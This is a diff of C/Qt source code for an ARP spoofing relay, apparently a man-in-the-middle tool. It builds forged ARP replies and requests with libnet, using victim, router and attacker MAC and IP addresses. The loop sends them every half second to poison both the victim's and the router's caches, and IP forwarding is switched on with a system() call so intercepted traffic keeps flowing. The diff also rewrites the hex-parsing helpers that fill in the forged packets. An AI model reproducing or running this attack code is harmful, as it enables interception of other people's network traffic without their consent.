@@ -12,11 +12,13 @@
 #include <unistd.h>
 #include <netdb.h>
 #include <libnet.h>
+#define mac_size 6
+#define ip_size 4
 
 void request_packet();
 void reply_packet();
-void reply_filter_mac(char *get, u_char *my);
-void reply_filter_ip(char *get, u_char *my);
+void reply_mac_filter(char *get, u_char *my, int size);
+void reply_filter(char *get, u_char *my);
 //void reply_print_packet(int len, u_char *packet);
 
 QString relay_len, relay_my_mac, relay_router_mac, relay_router_ip, relay_victim_mac, relay_victim_ip;
@@ -46,34 +48,41 @@ relay_falsify::relay_falsify(QObject *parent) : QThread(parent)
 
 void relay_falsify::run() {
     this->stop = true;
-//    system("echo 1> /proc/sys/net/ipv4/ip_forward");
+    if(relay_len.toInt() > 42) {
+        int size = sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr);
+        pack += size;
+        for(int i = 0; i < relay_len.toInt() - size; i++) *(pack + i) = 0x00;
+        pack -= size;
+    }
+
+    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
     while(this->stop) {
-        sleep(1);
+        usleep(500000);
         reply_packet();
         request_packet();
-        sleep(1);
-        request_packet();
+        usleep(500000);
+        reply_packet();
     }
-//    system("echo 0> /proc/sys/net/ipv4/ip_forward");
+    system("echo 0 > /proc/sys/net/ipv4/ip_forward");
 }
 
 void reply_packet() {
     struct arphdr *arph;
     arph = (struct arphdr *)(pack + sizeof(struct libnet_ethernet_hdr));
 
-    reply_filter_mac(relay_victim_mac.toLatin1().data(), pack);
-    reply_filter_mac(relay_my_mac.toLatin1().data(), pack+ETHER_ADDR_LEN);
+    reply_mac_filter(relay_victim_mac.toLatin1().data(), pack, mac_size);
+    reply_mac_filter(relay_my_mac.toLatin1().data(), pack+ETHER_ADDR_LEN, mac_size);
 
     pack += sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tpa) - sizeof(arph->tha) - sizeof(arph->spa) - sizeof(arph->sha);
 
     *(pack - 1) = ARPOP_REPLY;
-    reply_filter_mac(relay_my_mac.toLatin1().data(), pack);
-    reply_filter_ip(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), pack+ETHER_ADDR_LEN);
+    reply_mac_filter(relay_my_mac.toLatin1().data(), pack, mac_size);
+    reply_mac_filter(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), pack+ETHER_ADDR_LEN, ip_size);
 
     pack += sizeof(arph->sha) + sizeof(arph->spa);
 
-    reply_filter_mac(relay_victim_mac.toLatin1().data(), pack);
-    reply_filter_ip(QString::number(QHostAddress(relay_victim_ip).toIPv4Address(), 16).toLatin1().data(), pack+ETHER_ADDR_LEN);
+    reply_mac_filter(relay_victim_mac.toLatin1().data(), pack, mac_size);
+    reply_mac_filter(QString::number(QHostAddress(relay_victim_ip).toIPv4Address(), 16).toLatin1().data(), pack+ETHER_ADDR_LEN, ip_size);
 
     pack -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tha) - sizeof(arph->tpa);
 
@@ -87,10 +96,10 @@ void request_packet() {
     struct arphdr *arph;
     arph = (struct arphdr *)(pack + sizeof(struct libnet_ethernet_hdr));
 
-    reply_filter_mac(relay_my_mac.toLatin1().data(), pack+ETHER_ADDR_LEN);
-    reply_filter_mac(relay_my_mac.toLatin1().data(), pack+sizeof(struct libnet_ethernet_hdr)+sizeof(struct arphdr)-sizeof(arph->tpa)-sizeof(arph->tha)-sizeof(arph->spa)-sizeof(arph->sha));
-    reply_filter_ip(QString::number(QHostAddress(relay_victim_ip).toIPv4Address(), 16).toLatin1().data(), pack+sizeof(struct libnet_ethernet_hdr)+sizeof(struct arphdr)-sizeof(arph->tpa)-sizeof(arph->tha)-sizeof(arph->spa));
-    reply_filter_ip(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), pack+sizeof(struct libnet_ethernet_hdr)+sizeof(struct arphdr)-sizeof(arph->tpa));
+    reply_mac_filter(relay_my_mac.toLatin1().data(), pack+ETHER_ADDR_LEN, mac_size);
+    reply_mac_filter(relay_my_mac.toLatin1().data(), pack+sizeof(struct libnet_ethernet_hdr)+sizeof(struct arphdr)-sizeof(arph->tpa)-sizeof(arph->tha)-sizeof(arph->spa)-sizeof(arph->sha), mac_size);
+    reply_mac_filter(QString::number(QHostAddress(relay_victim_ip).toIPv4Address(), 16).toLatin1().data(), pack+sizeof(struct libnet_ethernet_hdr)+sizeof(struct arphdr)-sizeof(arph->tpa)-sizeof(arph->tha)-sizeof(arph->spa), ip_size);
+    reply_mac_filter(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), pack+sizeof(struct libnet_ethernet_hdr)+sizeof(struct arphdr)-sizeof(arph->tpa), ip_size);
 
     if(cnt%2 == 0) {
         for(i = 0; i < ETHER_ADDR_LEN; i++) *(pack+i) = *(bc_f+i);
@@ -100,11 +109,11 @@ void request_packet() {
         for(i = 0; i < ETHER_ADDR_LEN; i++) *(pack+i) = *(bc_0+i);
     }
     else {
-        reply_filter_mac(relay_router_mac.toLatin1().data(), pack);
+        reply_mac_filter(relay_router_mac.toLatin1().data(), pack, mac_size);
         pack += sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tpa) - sizeof(arph->tha) - sizeof(arph->spa) - sizeof(arph->sha);
         *(pack - 1) = ARPOP_REPLY;
         pack += sizeof(arph->sha) + sizeof(arph->spa);
-        reply_filter_mac(relay_router_mac.toLatin1().data(), pack);
+        reply_mac_filter(relay_router_mac.toLatin1().data(), pack, mac_size);
     }
     cnt++;
 
@@ -115,37 +124,22 @@ void request_packet() {
 //    reply_print_packet(relay_len.toInt(), pack);
 }
 
-void reply_filter_mac(char *get, u_char *my) {	// owner mac address save at my_mac variable
-    int i, j = 0;
-    for(i = 0; i < ETHER_ADDR_LEN; i++) {
-        if(*(get+j) < 'a') {
-            *(my+i) = (*(get+j) - '0') * 0x10;
-            if(*(get+j+1) < 'a') *(my+i) += (*(get+j+1) - '0') * 0x01;
-            else *(my+i) += (*(get+j+1) == 'a') ? 0x0a : ((*(get+j+1) == 'b') ? 0x0b : ((*(get+j+1) == 'c') ? 0x0c : ((*(get+j+1) == 'd') ? 0x0d : ((*(get+j+1) == 'e') ? 0x0e : 0x0f))));
-        }
-        else {
-            *(my+i) = (*(get+j) == 'a') ? 0xa0 : ((*(get+j) == 'b') ? 0xb0 : ((*(get+j) == 'c') ? 0xc0 : ((*(get+j) == 'd') ? 0xd0 : ((*(get+j) == 'e') ? 0xe0 : 0xf0))));
-            if(*(get+j+1) < 'a') *(my+i) += (*(get+j+1) - '0') * 0x01;
-            else *(my+i) += (*(get+j+1) == 'a') ? 0x0a : ((*(get+j+1) == 'b') ? 0x0b : ((*(get+j+1) == 'c') ? 0x0c : ((*(get+j+1) == 'd') ? 0x0d : ((*(get+j+1) == 'e') ? 0x0e : 0x0f))));
-        }
-        j += 2;
-    }
+void reply_mac_filter(char *get, u_char *my, int size) {	// owner mac address save at my_mac variable
+    int i, j;
+    if(size == ETHER_ADDR_LEN) for(i = 0, j = 0; i < ETHER_ADDR_LEN; i++, j+=2) reply_filter(get+j, my+i);
+    else for(i = 0, j = 0; i < (ETHER_ADDR_LEN - 2); i++, j+=2) reply_filter(get+j, my+i);
 }
 
-void reply_filter_ip(char *get, u_char *my) {	// owner mac address save at my_mac variable
-    int i, j = 0;
-    for(i = 0; i < 4; i++) {
-        if(*(get+j) < 'a') {
-            *(my+i) = (*(get+j) - '0') * 0x10;
-            if(*(get+j+1) < 'a') *(my+i) += (*(get+j+1) - '0') * 0x01;
-            else *(my+i) += (*(get+j+1) == 'a') ? 0x0a : ((*(get+j+1) == 'b') ? 0x0b : ((*(get+j+1) == 'c') ? 0x0c : ((*(get+j+1) == 'd') ? 0x0d : ((*(get+j+1) == 'e') ? 0x0e : 0x0f))));
-        }
-        else {
-            *(my+i) = (*(get+j) == 'a') ? 0xa0 : ((*(get+j) == 'b') ? 0xb0 : ((*(get+j) == 'c') ? 0xc0 : ((*(get+j) == 'd') ? 0xd0 : ((*(get+j) == 'e') ? 0x0e : 0x0f))));
-            if(*(get+j+1) < 'a') *(my+i) += (*(get+j+1) - '0') * 0x01;
-            else *(my+i) += (*(get+j+1) == 'a') ? 0x0a : ((*(get+j+1) == 'b') ? 0x0b : ((*(get+j+1) == 'c') ? 0x0c : ((*(get+j+1) == 'd') ? 0x0d : ((*(get+j+1) == 'e') ? 0x0e : 0x0f))));
-        }
-        j += 2;
+void reply_filter(char *get, u_char *my) {
+    if(*get - '0' < 0x10) {
+        *my = (*get - '0') * 0x10;
+        if(*(get+1) - '0' < 0x10) *my += (*(get+1) - '0') * 0x01;
+        else *my += (*(get+1) - '0' == 0x31) ? 0x0a : ((*(get+1) - '0' == 0x32) ? 0x0b : ((*(get+1) - '0' == 0x33) ? 0x0c : ((*(get+1) - '0' == 0x34) ? 0x0d : ((*(get+1) - '0' == 0x35) ? 0x0e : 0x0f))));
+    }
+    else {
+        *my = (*get - '0' == 0x31) ? 0xa0 : ((*get - '0' == 0x32) ? 0xb0 : ((*get - '0' == 0x33) ? 0xc0 : ((*get - '0' == 0x34) ? 0xd0 : ((*get - '0' == 0x35) ? 0xe0 : 0xf0))));
+        if(*(get+1) - '0' < 0x10) *my += (*(get+1) - '0') * 0x01;
+        else *my += (*(get+1) - '0' == 0x31) ? 0x0a : ((*(get+1) - '0' == 0x32) ? 0x0b : ((*(get+1) - '0' == 0x33) ? 0x0c : ((*(get+1) - '0' == 0x34) ? 0x0d : ((*(get+1) - '0' == 0x35) ? 0x0e : 0x0f))));
     }
 }
 /*
